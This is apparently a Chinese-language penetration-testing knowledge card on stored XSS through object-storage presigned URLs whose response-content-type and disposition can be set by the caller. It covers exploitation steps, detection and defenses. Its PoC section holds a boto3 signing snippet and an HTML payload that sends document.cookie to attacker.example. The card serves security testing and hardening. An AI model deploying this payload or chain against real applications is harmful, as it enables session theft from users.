---
id: web-generic-file-upload-presigned-url-response-content-type-xss
title: 对象存储预签名 URL 覆盖 response-content-type 把上传文件当 HTML 渲染的存储型 XSS
type: scenario
domain: web
path: web/generic/file-upload
technique: presigned-url-response-content-type-override-xss
aliases:
- 预签名 URL Content-Type 覆盖
- response-content-type XSS
- OSS/COS/S3 预签名 XSS
- 上传图片渲染为 HTML
- response-content-disposition inline
- 对象存储存储型 XSS
tags:
- web
- file-upload
- stored-xss
- object-storage
- oss
- cos
- s3
- presigned-url
- response-content-type
- cdn
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:48:40+08:00'
  notes: 原文无图片，为防御综述；全文含占位CVE(CVE-2025-XXXXX)、未证实百分比与错误论断(称签名算法不校验请求头)。卡片未照抄该错误，反而明确response-*参数通常纳入SigV4签名、攻击者不能向已签名URL追加参数，正确前提是签名/下载接口把response-content-type等暴露给调用者，并给出boto3生成示例与边界，技术自洽。未验证点：原文无真实目标、无请求/响应抓包、未打通；该场景为条件性设计缺陷，confidence medium恰当，需按云厂商签名规则与同源条件实测；无affected_versions、无sources/source_url。
---

## 一句话结论

S3/COS/OSS 的预签名 GET URL 支持 `response-content-type`、`response-content-disposition` 等响应头覆盖参数；若应用的签名/下载接口允许调用者控制这些参数，攻击者可上传内容为 HTML 的“图片”，再取得签名为 `text/html` + `inline` 的 URL，让浏览器把对象当页面渲染并执行脚本，形成存储型 XSS。

## 原理

- 对象存储的预签名 URL 除了携带签名，还支持 `response-content-type`、`response-content-disposition`、`response-cache-control` 等查询参数，用于临时覆盖本次 GET 的响应头（AWS S3、腾讯云 COS、阿里云 OSS 均有同类能力）。
- 关键点：这些参数通常会被纳入签名计算（SigV4 的 canonical query string）。因此**攻击者不能在一个已签名 URL 后面随意追加参数**——追加会导致签名不匹配。真正的缺陷是**生成预签名 URL 的服务端接口接受/透传了用户可控的 `response-content-type` 与 `response-content-disposition`**，把“响应头选择权”交给了调用者。
- 攻击链：
  1. 上传一个内容为 HTML/JS 的文件，扩展名使用图片（如 `x.jpg`），以通过只按扩展名/MIME 校验的上传接口；若上传还校验魔数，可用 GIF/JPEG 文件头 + HTML 尾部的 polyglot。
  2. 调用下载/预览接口获取预签名 URL，并把 `response-content-type` 设为 `text/html`、`response-content-disposition` 设为 `inline`（若接口接受这些参数）。
  3. 对象存储返回该对象时使用 `Content-Type: text/html`、`Content-Disposition: inline`，浏览器按 HTML 解析文件内容，执行其中的 `<script>`。
- 这绕过了“扩展名白名单/图片类型校验”：对象在存储侧仍叫 `.jpg`，但响应阶段的 Content-Type 被覆盖为 HTML，浏览器不再把它当图片。
- 同源条件是影响上限的关键：若对象存储绑定应用的自定义域名、或经同站 CDN 回源，脚本运行在应用站点源下，可读取非 HttpOnly Cookie、调用同源接口；若存储域名与主站跨站，危害主要限于存储域（钓鱼、窃取该域下 token）。
- 原文把成因写成“签名算法不验证请求头”，这不准确；正确的利用前提是签名服务把响应头参数暴露给用户，或对象存储/CDN 对未签名参数放行（需实测）。

## 触发条件

- 应用允许上传内容可控的文件，且上传校验可被图片扩展名/MIME/文件头 polyglot 绕过（或直接允许 HTML/SVG）。
- 应用的预签名/下载接口接受调用者传入的 `response-content-type`、`response-content-disposition` 等参数，并将其纳入签名；或将响应头直接取自用户可控的文件名/扩展名。
- 预签名 URL 被浏览器以顶层导航或 iframe 打开，且 `Content-Disposition` 为 `inline`（或被覆盖为 inline）。
- 响应未设置 `X-Content-Type-Options: nosniff`，也没有严格的 CSP/sandbox 限制。
- 若目标是主站 Cookie/接口，对象存储需与应用同站（自定义域名/CDN）。

## 利用步骤

1. 找到上传接口，上传内容为 HTML 的文件（扩展名可用 `.jpg`/`.png`，必要时在文件头加图片魔数做成 polyglot），记录对象 Key/URL。
2. 找到下载/预览接口，抓取其生成预签名 URL 的请求，测试是否接受 `response-content-type`、`response-content-disposition` 参数，以及参数是否出现在最终签名 URL 中。
3. 请求预签名 URL 时设置 `response-content-type=text/html`、`response-content-disposition=inline`，或通过应用的下载参数间接设置。
4. 用 curl 检查响应头是否为 `Content-Type: text/html`、`Content-Disposition: inline`；用浏览器打开 URL，确认 HTML/JS 执行。
5. 若与主站同源，读取 Cookie/发起同源请求；否则构造钓鱼页或窃取存储域下的 token。
6. 记录完整的签名 URL 生成请求与响应头，确认可重复。

## PoC

```python
import boto3

s3 = boto3.client("s3", region_name="us-east-1")

# 应用若把 ResponseContentType/ResponseContentDisposition 暴露给调用者，
# 生成的 URL 会把这些参数纳入签名
url = s3.generate_presigned_url(
    "get_object",
    Params={
        "Bucket": "example-bucket",
        "Key": "uploads/x.jpg",
        "ResponseContentType": "text/html",
        "ResponseContentDisposition": "inline",
    },
    ExpiresIn=3600,
)
print(url)
```

```text
curl -I "<预签名 URL>"
# 预期：
# Content-Type: text/html
# Content-Disposition: inline
```

```html
<!-- 上传为 x.jpg 的对象内容；若上传校验魔数，可在前面加 GIF89a/JPEG 头 -->
<html><body><script>
  // 同源时可读取非 HttpOnly Cookie / 发起同源请求
  new Image().src = "https://attacker.example/?" + encodeURIComponent(document.cookie);
</script></body></html>
```

```text
注意：直接向已签名的 URL 追加 ?response-content-type=text/html 通常会导致签名失效；
必须先由签名接口接受该参数，或确认目标存储/CDN 不校验该参数。原文声称“签名不校验请求头”
与此不符，利用前必须实测签名行为。
```

## 变体与关联

- 变体：`response-content-disposition=attachment` 是防御手段；若应用允许覆盖为 `inline`，或本来就返回 inline，则风险成立。
- 变体：CDN 回源时若透传 `response-content-type` 且缓存键未包含该参数，可能进一步形成缓存投毒/缓存型 XSS。
- 变体：SVG 对象本身按 `image/svg+xml` 即可执行脚本，无需覆盖 Content-Type；本卡关注的是绕过图片扩展名/MIME 校验后由响应头覆盖触发的 HTML 执行。
- 关联卡片：[[web-generic-file-upload-html-static-stored-xss]]（普通静态目录的 HTML 上传 XSS）；[[cloud-object-storage-bucket-acl-misconfig]]（对象存储公共读写/公共读与内容托管）；[[cloud-s3-presigned-url-vpce-bypass]]（预签名 URL 的另一类滥用）。
- 边界：若签名接口只允许服务端固定响应头、忽略客户端参数，或存储/CDN 对 response-* 强制签名校验且不透明传，本手法不成立；原文未提供可运行目标与响应头抓包，需按实际云厂商签名规则验证。

## 检测与防御

- 修复：预签名/下载接口不要接受客户端传入的 `response-content-type`、`response-content-disposition`；响应头由服务端根据对象真实类型固定，用户上传文件一律 `Content-Disposition: attachment`。
- 加固：上传内容做真实类型识别与重编码（图片重新编码可破坏 HTML/polyglot）；对象存储使用独立域名，切断与主站 Cookie/同源接口的联系；响应加 `X-Content-Type-Options: nosniff` 与严格 CSP；CDN 缓存键包含 response-* 参数或直接剥离。
- 检测：审计预签名接口的参数白名单；监控 `response-content-type=text/html`、`response-content-disposition=inline` 的请求；检查对象 Key 扩展名与真实内容/MIME 不一致；对上传后立即被浏览器访问的对象告警。
